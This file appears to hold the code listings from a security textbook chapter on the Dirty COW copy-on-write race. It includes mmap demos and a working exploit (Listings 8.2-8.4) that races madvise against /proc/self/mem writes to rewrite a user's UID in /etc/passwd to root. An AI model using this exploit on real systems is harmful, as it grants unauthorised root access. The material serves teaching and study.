/******************************
 * Code in Chapter 8
 ******************************/



/**********************************************
 * Code on Page 138 (Section 8.1)
 **********************************************/
/* mmap_example.c */
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>

int main()
{
  struct stat st;
  char content[20];
  char *new_content = "New Content";
  void *map;

  int f=open("./zzz", O_RDWR);                     
  fstat(f, &st);
  // Map the entire file to memory 
  map=mmap(NULL, st.st_size, PROT_READ|PROT_WRITE,  
                             MAP_SHARED, f, 0); 

  // Read 10 bytes from the file via the mapped memory 
  memcpy((void*)content, map, 10);                 
  printf("read: %s\n", content);

  // Write to the file via the mapped memory
  memcpy(map+5, new_content, strlen(new_content));  

  // Clean up
  munmap(map, st.st_size);
  close(f);
  return 0;
}
 

/**********************************************
 * Listing 8.1: Map a read-only file
 **********************************************/

/* cow_map_readonly_file.c */
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[])
{
  char *content="**New content**";
  char buffer[30];
  struct stat st;
  void *map;

  int f=open("/zzz", O_RDONLY);
  fstat(f, &st);
  map=mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0); 

  // Open the process's memory pseudo-file
  int fm=open("/proc/self/mem", O_RDWR);                   

  // Start at the 5th byte from the beginning.
  lseek(fm, (off_t) map + 5, SEEK_SET);                   

  // Write to the memory
  write(fm, content, strlen(content));                   

  // Check whether the write is successful
  memcpy(buffer, map, 29);
  printf("Content after write: %s\n", buffer);

  // Check content after madvise
  madvise(map, st.st_size, MADV_DONTNEED);              
  memcpy(buffer, map, 29);
  printf("Content after madvise: %s\n", buffer);

  return 0;
}
 
/**********************************************
 * Listing 8.2: The main thread
 **********************************************/

/* cow_attack_passwd.c  (the main thread) */

#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;

int main(int argc, char *argv[])
{
  pthread_t pth1,pth2;
  struct stat st;
  int file_size;

  // Open the target file in the read-only mode.
  int f=open("/etc/passwd", O_RDONLY);

  // Map the file to COW memory using MAP_PRIVATE.
  fstat(f, &st);
  file_size = st.st_size;
  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

  // Find the position of the target area
  char *position = strstr(map, "testcow:x:1001");                

  // We have to do the attack using two threads.
  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
  pthread_create(&pth2, NULL, writeThread, position);            

  // Wait for the threads to finish.
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}


/**********************************************
 * Listing 8.3: The write thread
 **********************************************/

/* cow_attack_passwd.c (the write thread) */

void *writeThread(void *arg)
{
  char *content= "testcow:x:0000";
  off_t offset = (off_t) arg;

  int f=open("/proc/self/mem", O_RDWR);
  while(1) {
    // Move the file pointer to the corresponding position.
    lseek(f, offset, SEEK_SET);
    // Write to the memory.
    write(f, content, strlen(content));
  }
}


/**********************************************
 * Listing 8.4: The madvise thread
 **********************************************/

/* cow_attack_passwd.c (the madvise thread) */

void *madviseThread(void *arg)
{
  int file_size = (int) arg;
  while(1){
      madvise(map, file_size, MADV_DONTNEED);
  }
}
\end{lstlisting}


